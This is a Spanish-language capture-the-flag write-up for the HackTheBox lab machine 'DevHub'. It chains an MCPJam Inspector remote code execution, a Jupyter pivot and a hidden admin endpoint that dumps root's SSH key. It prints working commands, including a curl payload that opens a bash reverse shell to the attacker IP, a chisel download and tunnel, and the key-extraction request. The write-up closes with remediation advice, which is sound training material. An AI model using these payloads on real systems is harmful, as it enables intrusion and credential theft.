# HackTheBox — DevHub Writeup
**Dificultad:** Medium  
**OS:** Linux  
**Fecha:** Julio 2026  
**Autor:** Samuel

## Resumen Ejecutivo

DevHub es una máquina de dificultad media que simula una infraestructura de desarrollo con servicios MCP 
(Model Context Protocol), Jupyter Lab y una API interna de operaciones. El vector de entrada es una 
vulnerabilidad de ejecución remota de código en MCPJam Inspector v1.4.2 (CVE-2026-23744). 
El movimiento lateral se logra mediante port forwarding hacia una instancia de Jupyter Lab interna, 
accesible sin autenticación efectiva. La escalada de privilegios se consigue identificando un API key
hardcodeado en el código fuente de un servicio interno (`opsmcp`), cuyo endpoint oculto permite extraer la clave SSH privada de root.

## Reconocimiento

### Escaneo de puertos
nmap -sC -sV -p- devhub.htb

**Servicios identificados:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | nginx 1.18.0 |
| 6274 | TCP | MCPJam Inspector v1.4.2 |

La página estática en el puerto 80 revela la existencia de un **MCP Inspector** en el puerto 6274 y un **dashboard interno** en `localhost:8888`.
El stack tecnológico identificado: Python3, Node.js, Jupyter Lab.

### Enumeración web

El fuzzing al puerto 6274 devuelve respuestas con wildcard (mismo tamaño para cualquier ruta). Se filtra por tamaño con `--fs 466` y se prueban rutas conocidas del CVE manualmente:

curl -sv http://devhub.htb:6274/api/mcp/connect

El dashboard de MCPJam es accesible desde el browser en `http://devhub.htb:6274`, exponiendo las rutas `/#servers`, `/#chat-v2` y `/#settings`.

---

## Análisis de Vulnerabilidades

### CVE-2026-23744 — MCPJam Inspector v1.4.2 RCE

MCPJam Inspector en versiones <= 1.4.2 expone el endpoint `/api/mcp/connect` sin autenticación. El parámetro `serverConfig` acepta un comando arbitrario que el servidor ejecuta directamente, sin validación de input.

**Verificación del endpoint:**

```bash
curl http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"echo","args":["hello world"],"env":{}},"serverId":"test"}'
```

Respuesta:

{"success":false,"error":"Connection failed for server test: MCP error -32000: Connection closed","details":"MCP error -32000: Connection closed"}
```

El error `Connection closed` confirma que el comando se ejecutó — `echo` termina inmediatamente sin mantener la conexión MCP, pero la ejecución ocurrió.

---

## Explotación — Acceso Inicial

### Reverse shell como mcp-dev

Listener en Kali:
```bash
nc -lvnp 4444
```

Payload:
```bash
curl http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.87/4444 0>&1"],"env":{}},"serverId":"pwned"}'
```

Shell obtenida como usuario `mcp-dev`.

---

## Movimiento Lateral — mcp-dev → analyst

### Identificación de Jupyter en localhost

```bash
curl -s http://127.0.0.1:8888/api
# {"version": "2.17.0"}
```

Jupyter Lab corre internamente en el puerto 8888. Para acceder desde Kali se configura un túnel con Chisel.

### Port forwarding con Chisel

**En Kali:**
```bash
./chisel server -p 9001 --reverse
python3 -m http.server 80
```

**En la víctima:**
```bash
wget http://10.10.14.87/chisel -O /tmp/chisel
chmod +x /tmp/chisel
/tmp/chisel client 10.10.14.87:9001 R:8888:127.0.0.1:8888 &
```

El dashboard de Jupyter es ahora accesible en `http://127.0.0.1:8888` desde Kali.

### Obtención del token de Jupyter

El token aparece en la línea de comando del proceso:

```bash
ps aux | grep jupyter
```

```
analyst  67541  ... /bin/bash /home/analyst/jupyter-env/bin/jupyter lab ... 
--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

### Ejecución de código como analyst

Tras autenticarse en Jupyter con el token, se abre el notebook `quarterly_analysis.ipynb` y se ejecuta:

```python
import os
print(os.popen('id').read())
# uid=1001(analyst) gid=1001(analyst) groups=1001(analyst)
```

Jupyter corre como el usuario `analyst` — movimiento lateral confirmado.

### Flag de usuario

```python
import os
print(os.popen('cat /home/analyst/user.txt').read())
```

---

## Escalada de Privilegios — analyst → root

### Enumeración con LinPEAS

LinPEAS identifica una entrada crítica en la sección de PATH de Systemd:

```
jupyter.service: Writable service PATH entry '/home/analyst/jupyter-env/bin'
opsmcp.service: Writable service PATH entry '/home/analyst/jupyter-env/bin'
```

### Identificación del servicio vulnerable

```bash
ps aux | grep python
# root  1083  ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

```bash
cat /etc/systemd/system/opsmcp.service
```

```ini
[Service]
Type=simple
User=root
WorkingDirectory=/opt/opsmcp
Environment=PATH=/home/analyst/jupyter-env/bin:/usr/local/bin:/usr/bin:/bin
ExecStart=/home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
Restart=always
RestartSec=10
```

`opsmcp.service` corre como **root** usando el binario `python3` ubicado en el virtualenv de `analyst` — que analyst puede modificar.

### Análisis de server.py

La revisión del código fuente de `/opt/opsmcp/server.py` revela:

1. Un **API key hardcodeado**: `opsmcp_secret_key_4f5a6b7c8d9e0f1a`
2. Una **herramienta oculta** `ops._admin_dump` no listada en `/tools/list` pero callable desde `/tools/call`
3. El target `ssh_keys` lee y devuelve `/root/.ssh/id_rsa`

### Extracción de la clave SSH de root

```bash
curl -s http://127.0.0.1:5000/tools/call \
  -H "Content-Type: application/json" \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

La respuesta incluye la clave privada RSA de root en texto plano.

### Acceso SSH como root

En Kali:
```bash
nano /tmp/root_key  # pegar la clave privada
chmod 600 /tmp/root_key
ssh -i /tmp/root_key root@devhub.htb
```

### Flag de root

```bash
cat /root/root.txt
```

---

## Cadena de Ataque

```
CVE-2026-23744 (MCPJam RCE)
        ↓
   Shell: mcp-dev
        ↓
Chisel tunnel → Jupyter Lab (localhost:8888)
        ↓
   Shell: analyst (RCE via notebook)
        ↓
API key hardcodeado en opsmcp/server.py
        ↓
ops._admin_dump → /root/.ssh/id_rsa
        ↓
   SSH como root
```

---

## Remediación

| Vulnerabilidad | Remediación |
|----------------|-------------|
| CVE-2026-23744 MCPJam RCE | Actualizar MCPJam Inspector a v1.4.3 o superior |
| Jupyter sin autenticación efectiva | Configurar contraseña robusta y restringir acceso por red |
| PATH hijacking en opsmcp.service | Usar rutas absolutas al binario de Python en el unit file; no incluir directorios escribibles por usuarios no privilegiados en el PATH de servicios root |
| API key hardcodeado en código fuente | Usar variables de entorno o un gestor de secretos; rotar la clave comprometida |
| Herramienta `_admin_dump` expuesta | Eliminar endpoints de dump de credenciales en producción; nunca almacenar claves privadas accesibles por una API |

---

## Lecciones Aprendidas

- **MCP (Model Context Protocol)** es una superficie de ataque emergente. Los servicios MCP expuestos sin autenticación representan RCE directo.
- **Jupyter Lab** en entornos internos frecuentemente carece de controles de acceso adecuados y equivale a RCE como el usuario que lo ejecuta.
- **Secrets en código fuente** siguen siendo uno de los vectores más comunes en entornos reales. La revisión manual de scripts internos es parte fundamental de la post-explotación.
- **PATH hijacking en servicios systemd** es un vector poderoso cuando un servicio privilegiado incluye directorios escribibles por usuarios no privilegiados al inicio del PATH.

